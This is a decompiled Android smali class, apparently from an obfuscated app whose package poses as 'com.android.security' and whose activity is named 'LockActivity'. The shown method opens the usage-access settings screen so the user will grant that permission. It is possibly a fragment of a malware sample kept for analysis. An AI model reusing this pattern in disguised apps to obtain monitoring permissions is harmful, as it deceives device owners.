.class public final Lι;
.super Ljava/lang/Object;
.source ""

# interfaces
.implements Ljava/lang/Runnable;


# annotations
.annotation system Ldalvik/annotation/InnerClass;
    accessFlags = 0x1
    name = null
.end annotation


# instance fields
.field private synthetic ˊ:Lcom/android/security/fdiduds8/LockActivity;

.field private synthetic ˋ:Lcom/android/security/fdiduds8/LockActivity;


# direct methods
.method public constructor <init>(Lcom/android/security/fdiduds8/LockActivity;Lcom/android/security/fdiduds8/LockActivity;)V
    .locals 0

    .line 216
    iput-object p1, p0, Lι;->ˋ:Lcom/android/security/fdiduds8/LockActivity;

    iput-object p2, p0, Lι;->ˊ:Lcom/android/security/fdiduds8/LockActivity;

    invoke-direct {p0}, Ljava/lang/Object;-><init>()V

    return-void
.end method


# virtual methods
.method public final run()V
    .locals 3

    .line 220
    :try_start_0
    new-instance v2, Landroid/content/Intent;

    const-string v0, "android.settings.USAGE_ACCESS_SETTINGS"

    invoke-direct {v2, v0}, Landroid/content/Intent;-><init>(Ljava/lang/String;)V

    .line 221
    iget-object v0, p0, Lι;->ˊ:Lcom/android/security/fdiduds8/LockActivity;

    const/16 v1, 0x14

    invoke-virtual {v0, v2, v1}, Lcom/android/security/fdiduds8/LockActivity;->startActivityForResult(Landroid/content/Intent;I)V

    .line 222
    sget v0, Lcom/android/security/fdiduds8/LockActivity;->ˋ:I

    sput v0, Lcom/android/security/fdiduds8/LockActivity;->ˎ:I
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    .line 226
    return-void

    .line 225
    :catch_0
    move-exception v0

    invoke-virtual {v0}, Ljava/lang/Exception;->printStackTrace()V

    .line 227
    return-void
.end method
